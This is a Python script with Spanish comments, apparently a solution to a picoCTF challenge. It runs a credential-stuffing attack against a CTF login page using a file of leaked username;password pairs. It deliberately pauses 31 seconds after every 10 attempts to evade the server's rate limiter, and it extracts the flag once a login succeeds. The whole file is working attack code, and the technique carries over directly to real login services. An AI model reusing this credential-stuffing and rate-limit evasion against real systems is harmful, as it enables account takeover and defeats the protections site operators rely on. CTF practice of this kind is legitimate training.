import requests
import time

URL = "http://candy-mountain.picoctf.net:58729/login"

def solve():
    print("[*] Cargando diccionario de credenciales...")
    try:
        with open("creds-dump.txt", "r") as f:
            creds = [line.strip() for line in f.readlines() if line.strip()]
    except FileNotFoundError:
        print("[-] Error: No se encontró el archivo creds-dump.txt")
        return

    print(f"[*] Se cargaron {len(creds)} credenciales.")
    print("[*] Iniciando ataque con PACING (10 intentos cada 31 segundos)...")

    for i, line in enumerate(creds):
        # La magia ocurre acá: pausar justo antes de pasarnos del límite de 10
        if i > 0 and i % 10 == 0:
            print(f"\n[*] Límite de 10 peticiones alcanzado.")
            print(f"[*] Esperando 31 segundos para que el servidor resetee nuestro contador...")
            time.sleep(31)
            print("[*] ¡Contador en cero! Reanudando ataque...\n")

        username, password = line.split(';')

        data = {
            "username": username,
            "password": password
        }

        # allow_redirects=True nos lleva a la página con la flag si el login es correcto
        response = requests.post(URL, data=data, allow_redirects=True)

        if "Rate Limited" in response.text:
            print(f"[-] ERROR: Fuimos bloqueados en el intento {i+1}. El pacing falló.")
            break
            
        elif "Invalid username or password" not in response.text:
            print(f"\n[+] ¡ACCESO CONCEDIDO! Usuario: {username} | Contraseña: {password}")
            
            # Extraemos la bandera
            if "picoCTF{" in response.text:
                start = response.text.find("picoCTF{")
                end = response.text.find("}", start) + 1
                print(f"[🏆] FLAG: {response.text[start:end]}")
            break
        else:
            print(f"[{i+1}/100] Falló: {username}")

if __name__ == "__main__":
    solve()